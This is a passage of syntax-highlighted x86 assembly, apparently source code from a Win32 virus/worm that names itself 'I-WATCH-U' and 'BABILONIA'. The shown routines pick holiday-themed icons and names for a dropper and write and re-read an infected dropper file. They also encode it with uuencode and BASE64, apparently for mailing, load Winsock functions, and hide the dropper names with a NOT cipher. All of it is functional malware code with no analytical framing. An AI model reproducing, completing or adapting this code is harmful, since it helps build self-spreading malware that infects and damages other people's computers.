       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc0">

       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">dates</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)]</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">name0</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">myname</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
  </span><span class="sc5">@@next_date</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">lodsw</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@@is</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">@@nope</span><span class="sc0">                        </span><span class="sc1">;this holiday isnt this month</span><span class="sc0">
  </span><span class="sc5">@@is</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">pusha</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">mem</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)]</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">icon</span><span class="sc0">                    </span><span class="sc1">;where icon should go in dropper</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">coelho</span><span class="sc4">-</span><span class="sc5">icon</span><span class="sc4">)</span><span class="sc0">      </span><span class="sc1">;first icon</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1152</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                   </span><span class="sc1">;eax=count ecx=size icon</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">names</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+(</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)]</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">myname</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">   </span><span class="sc1">;get dropper name</span><span class="sc0">
       </span><span class="sc6">cdq</span><span class="sc0">
       </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                          </span><span class="sc1">;count*size+base=new icon</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                                </span><span class="sc1">;install new icon</span><span class="sc0">
       </span><span class="sc6">popa</span><span class="sc0">
  </span><span class="sc5">@@nope</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">@@next_date</span><span class="sc0">                        </span><span class="sc1">;check next date</span><span class="sc0">

       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">dropname</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)]</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">r3_open</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@@fux0r</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">DROPPER_SIZE</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">mem</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)]</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">r3_write</span><span class="sc0">                    </span><span class="sc1">;write clean dropper</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">r3_close</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">dropname</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)]</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">r3_open</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@@fux0r1</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">r3_seof</span><span class="sc0">                            </span><span class="sc1">;get new dropper size</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DROPPER_SIZE</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@@fux0r2</span><span class="sc0">                              </span><span class="sc1">;was infected?</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">r3_ssof</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">mem</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">r3_read</span><span class="sc0">                            </span><span class="sc1">;read infected dropper</span><span class="sc0">
  </span><span class="sc5">@@fux0r2</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">r3_close</span><span class="sc0">

  </span><span class="sc5">@@fux0r1</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">dropname</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)]</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0b8h</span><span class="sc0">
  </span><span class="sc5">_fdelete</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                         </span><span class="sc1">;edi=uuencode buffer</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;esi=image</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;ecx=size</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">uuencode</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">uudropper</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">uusize</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                          </span><span class="sc1">;esi=image</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;eax=size</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">BASE64</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">b64dropper</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">b64size</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">wsock</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)]</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0b8h</span><span class="sc0">
  </span><span class="sc5">_getmhandle</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">_getproc</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)]</span><span class="sc0">    </span><span class="sc1">;eax=wsokc32 base</span><span class="sc0">

       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@@112</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'WSAGetLastError'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
  </span><span class="sc5">@@112</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">_WSAGetLastError</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@@inited</span><span class="sc0">

  </span><span class="sc5">@@fux0r</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">mem</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
  </span><span class="sc5">@@inited</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">popa</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">init</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc5">decript_names</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
       </span><span class="sc6">pusha</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">name0</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)]</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">name_sz</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
  </span><span class="sc5">@@999</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">lodsb</span><span class="sc0">
       </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">                           </span><span class="sc1">;crypt/decrypt</span><span class="sc0">
       </span><span class="sc6">stosb</span><span class="sc0">
       </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">@@999</span><span class="sc0">
       </span><span class="sc6">popa</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">decript_names</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc5">ninsert</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
       </span><span class="sc6">pusha</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">decript_names</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">myname</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)]</span><span class="sc0">
  </span><span class="sc5">@@next</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">lodsb</span><span class="sc0">
       </span><span class="sc6">stosb</span><span class="sc0">
       </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@@next</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc12">'EXE.'</span><span class="sc0">
       </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">stosd</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">decript_names</span><span class="sc0">
       </span><span class="sc6">popa</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">ninsert</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc5">dates</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">06</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07</span><span class="sc0">                    </span><span class="sc1">; BABILONIA   - US FLAG</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0">                    </span><span class="sc1">; NAVIDAD     - Papai Noel</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">04</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04</span><span class="sc0">                    </span><span class="sc1">; PASCOA      - Ovo</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc0">                    </span><span class="sc1">; REYES MAGOS - Jesus</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11</span><span class="sc0">                    </span><span class="sc1">; HALLOWEN    - Abobora</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">03</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03</span><span class="sc0">                    </span><span class="sc1">; PASCOA2     - Coelho</span><span class="sc0">


</span><span class="sc5">name0</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'I-WATCH-U'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">;default name</span><span class="sc0">
</span><span class="sc5">name1</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'BABILONIA'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">name2</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'X-MAS'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">name3</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'SURPRISE!'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">name4</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'JESUS'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">name5</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'BUHH'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">name6</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'CHOCOLATE'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">name_sz</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">name0</span><span class="sc0">


</span><span class="sc5">names</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">name6</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)</span><span class="sc0">
       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">name5</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)</span><span class="sc0">
       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">name4</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)</span><span class="sc0">
       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">name3</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)</span><span class="sc0">
       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">name2</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)</span><span class="sc0">
       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">name1</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)</span><span class="sc0">
       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">


</span><span class="sc5">r3_open</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">22h</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0c0000000h</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
  </span><span class="sc5">_openfile</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">;CreateFileA</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">r3handle</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">r3_open</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc5">r3_close</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
     </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
  </span><span class="sc5">r3handle</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
  </span><span class="sc5">_closehandle</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">;CloseHandle</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">r3_close</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">


